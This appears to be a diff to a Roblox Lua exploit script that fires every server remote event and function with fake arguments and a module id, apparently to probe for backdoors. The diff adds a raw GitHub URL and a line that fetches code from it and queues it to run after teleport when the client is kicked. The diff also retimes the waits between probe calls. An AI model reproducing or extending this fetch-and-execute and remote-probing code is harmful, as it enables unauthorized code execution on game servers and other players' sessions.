@@ -1,4 +1,4 @@
-local urlforexe = ""
+local urlforexe = "https://raw.githubusercontent.com/adi33333333334/list/refs/heads/main/list.txt"
 local HttpService = game:GetService("HttpService")
 local apiDump,apiDumpUrl
 if not getgenv().apidumpisloaded then
@@ -128,7 +128,7 @@ fakes = check(forrealsies,{})
 game.LogService.MessageOut:connect(function(asd)
     if asd:lower():find'server kick' then
         table.insert(getgenv().excl, remi)
-        queue_on_teleport()
+        queue_on_teleport(game:HttpGet(urlforexe))
         game["Teleport Service"]:Teleport(placeid,game.Players.LocalPlayer)
     end
 end)
@@ -142,17 +142,12 @@ for i,rem in pairs(rems) do
         for i,v in pairs(fakes) do
             lastrem=rem
             rem:FireServer(nil,nil,nil,v)
-            task.wait(.2)
             rem:FireServer(nil,nil,v)
-            task.wait(.2)
             rem:FireServer(nil,v)
-            task.wait(.2)
             rem:FireServer(v)
-            task.wait(.2)
             rem:FireServer(nil,nil,nil,moduleid)
-            task.wait(.2)
             rem:FireServer(v,v,v,v,v,v,v)
-            task.wait(.2)
+            task.wait(.4)
         end
     end
     if rem:IsA"RemoteFunction" then
@@ -164,6 +159,7 @@ for i,rem in pairs(rems) do
             rem:InvokeServer(v)
             rem:InvokeServer(nil,nil,nil,moduleid)
             rem:InvokeServer(v,v,v,v,v,v,v)
+            task.wait(.2)
         end
     end
 end
